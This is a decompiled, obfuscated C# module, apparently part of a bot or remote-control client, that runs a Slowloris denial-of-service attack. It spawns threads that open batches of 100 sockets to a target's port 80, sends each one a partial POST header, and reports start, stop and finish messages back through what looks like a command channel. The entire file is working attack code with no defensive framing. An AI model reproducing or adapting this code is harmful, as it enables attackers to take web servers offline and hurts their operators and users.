using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class Slowloris
{
	private static object object_0;

	private static string string_0;

	private static string string_1;

	private static int int_0;

	private static int int_1;

	private static Thread[] thread_0;

	private static bool MtxqPjvydK;

	private static int int_2;

	static Slowloris()
	{
		Class13.eamVqU3zSE23Z();
		object_0 = 0;
		MtxqPjvydK = false;
		int_2 = 0;
	}

	public static void StartSlowloris(string Host, int Threadsto, int Time, string data)
	{
		checked
		{
			if (!MtxqPjvydK)
			{
				MtxqPjvydK = true;
				string_1 = Host;
				string_0 = data;
				int_1 = Threadsto;
				int_0 = Time;
				if (string_1.Contains("http://"))
				{
					string_1 = string_1.Replace("http://", string.Empty);
				}
				if (string_1.Contains("www."))
				{
					string_1 = string_1.Replace("www.", string.Empty);
				}
				if (string_1.Contains("/"))
				{
					string_1 = string_1.Replace("/", string.Empty);
				}
				thread_0 = new Thread[Threadsto - 1 + 1];
				Class6.smethod_25("MSG" + Class6.string_12 + "Slowloris Attack on " + string_1 + " started!");
				int num = Threadsto - 1;
				for (int i = 0; i <= num; i++)
				{
					thread_0[i] = new Thread(smethod_1);
					thread_0[i].IsBackground = true;
					thread_0[i].Start();
				}
			}
			else
			{
				Class6.smethod_25(("MSG" + Class6.string_12 + "Slowloris Attack is Already Running on " + string_1) ?? "");
			}
		}
	}

	private static void smethod_0()
	{
		object_0 = Operators.AddObject(object_0, (object)1);
		if (Operators.ConditionalCompareObjectEqual(object_0, (object)int_1, false))
		{
			object_0 = 0;
			int_1 = 0;
			MtxqPjvydK = false;
			Class6.smethod_25("MSG" + Class6.string_12 + "Slowloris Attack on " + string_1 + " finished successfully");
			int_2 = 0;
		}
	}

	public static void StopSlowloris()
	{
		checked
		{
			if (MtxqPjvydK)
			{
				int num = int_1 - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						thread_0[i].Abort();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				MtxqPjvydK = false;
				Class6.smethod_25("MSG" + Class6.string_12 + "Slowloris Attack on " + string_1 + " stopped successfully");
				int_2 = 0;
			}
			else
			{
				Class6.smethod_25("MSG" + Class6.string_12 + "No Slowloris Attack is running!");
			}
		}
	}

	private static void smethod_1()
	{
		checked
		{
			try
			{
				Socket[] array = new Socket[100];
				TimeSpan timeSpan = TimeSpan.FromSeconds(int_0);
				Stopwatch stopwatch = Stopwatch.StartNew();
				while (stopwatch.Elapsed < timeSpan)
				{
					try
					{
						new WebClient();
						int num = 0;
						do
						{
							array[num] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
							array[num].Connect(Dns.GetHostAddresses(string_1), 80);
							array[num].Send(Encoding.Default.GetBytes("POST / HTTP/1.1\r\nHost: " + string_1.ToString() + "\r\nContent-length: 5235\r\n\r\n"), SocketFlags.None);
							int_2++;
							num++;
						}
						while (num <= 99);
						int num2 = 0;
						do
						{
							array[num2].Close();
							num2++;
						}
						while (num2 <= 99);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			smethod_0();
		}
	}
}
